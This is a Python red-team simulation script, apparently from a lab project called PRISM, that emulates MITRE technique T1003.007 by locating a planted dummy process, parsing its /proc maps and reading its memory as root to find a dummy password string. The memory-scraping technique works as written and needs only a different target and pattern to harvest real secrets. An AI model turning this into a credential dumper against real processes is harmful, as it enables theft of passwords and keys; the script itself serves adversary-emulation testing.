#!/usr/bin/env python3
"""
PRISM Red Team — T1003.007: /proc Filesystem Memory Scan
Simulates surgical credential hunting via /proc/[pid]/mem.

Methodology:
  1. Locate the dummy_cred_holder process (our planted target)
  2. Parse /proc/[pid]/maps to identify heap/stack memory regions
  3. Read those regions from /proc/[pid]/mem
  4. Scan for credential-like patterns (regex on dummy string only)

This is NOT a real credential dumper. It targets a specifically planted dummy
process and looks only for a known dummy string pattern.
Requires root to read /proc/[pid]/mem of another process.
"""

import os
import re
import sys
import glob
import struct
import datetime
from pathlib import Path

LOG_DIR = Path(__file__).parent.parent.parent / "logs" / "raw"
LOG_DIR.mkdir(parents=True, exist_ok=True)
TIMESTAMP = datetime.datetime.now().strftime("%Y%m%dT%H%M%S")
LOGFILE = LOG_DIR / f"t1003_procmem_{TIMESTAMP}.log"

# Pattern to search for in target process memory — this is the planted dummy string
DUMMY_PATTERN = re.compile(rb"password=DUMMY_LAB_SECRET_PRISM_\d{4}")
TARGET_PROCESS_NAME = "dummy_cred_holder.sh"

def log(msg):
    print(msg)
    with open(LOGFILE, "a") as f:
        f.write(msg + "\n")

def find_target_pid():
    """Finds the PID of the dummy target script."""
    for proc_dir in glob.glob('/proc/[0-9]*'):
        try:
            with open(os.path.join(proc_dir, 'cmdline'), 'r') as f:
                cmdline = f.read().replace('\x00', ' ').strip()
                if TARGET_PROCESS_NAME in cmdline and "grep" not in cmdline:
                    pid = int(os.path.basename(proc_dir))
                    log(f"[T1003] Found target '{TARGET_PROCESS_NAME}' at PID {pid}")
                    return pid
        except (IOError, PermissionError):
            continue
    return None

def parse_maps(pid):
    """Parses /proc/[pid]/maps and yields readable memory regions."""
    regions = []
    maps_path = f"/proc/{pid}/maps"
    try:
        with open(maps_path, 'r') as f:
            for line in f:
                # Example line: 5560b37c0000-5560b37e1000 rw-p 00000000 00:00 0  [heap]
                parts = line.split()
                if len(parts) >= 2:
                    perms = parts[1]
                    if 'r' in perms: # Only care about readable regions
                        addr_range = parts[0].split('-')
                        start = int(addr_range[0], 16)
                        end = int(addr_range[1], 16)
                        name = parts[-1] if len(parts) >= 6 else "[anon]"
                        regions.append((start, end, name))
    except (IOError, PermissionError) as e:
        log(f"[T1003] Error reading maps for PID {pid}: {e}")
        log(f"[T1003] Hint: Are you running as root?")
    return regions

def scan_memory(pid, regions):
    """Reads /proc/[pid]/mem for the specified regions and searches for patterns."""
    mem_path = f"/proc/{pid}/mem"
    found = False
    
    try:
        with open(mem_path, 'rb') as f:
            for start, end, name in regions:
                try:
                    f.seek(start)
                    # Don't read huge regions, max 10MB chunk
                    chunk_size = min(end - start, 10 * 1024 * 1024)
                    data = f.read(chunk_size)
                    
                    matches = DUMMY_PATTERN.findall(data)
                    for match in matches:
                        log(f"[T1003] SUCCESS: Found simulated credential in '{name}' region (0x{start:x})")
                        log(f"[T1003] Extracted: {match.decode('utf-8')}")
                        found = True
                except (IOError, OSError):
                    pass # Ignore read errors for specific pages
    except PermissionError:
         log(f"[T1003] Permission denied opening {mem_path}. Must be root.")
         
    if not found:
         log(f"[T1003] Scan complete. Target string not found in memory.")

def main():
    log(f"--- PRISM T1003.007 Memory Scanner Started at {TIMESTAMP} ---")
    pid = find_target_pid()
    
    if not pid:
        log(f"[T1003] Error: Target '{TARGET_PROCESS_NAME}' is not running.")
        sys.exit(1)
        
    log(f"[T1003] Phase 1: Parsing memory maps (/proc/{pid}/maps)...")
    regions = parse_maps(pid)
    
    if not regions:
        log(f"[T1003] No readable regions found. Exiting.")
        sys.exit(1)
        
    log(f"[T1003] Phase 2: Scanning virtual memory (/proc/{pid}/mem)...")
    scan_memory(pid, regions)
    log(f"--- PRISM T1003.007 Memory Scanner Finished ---")

if __name__ == "__main__":
    main()
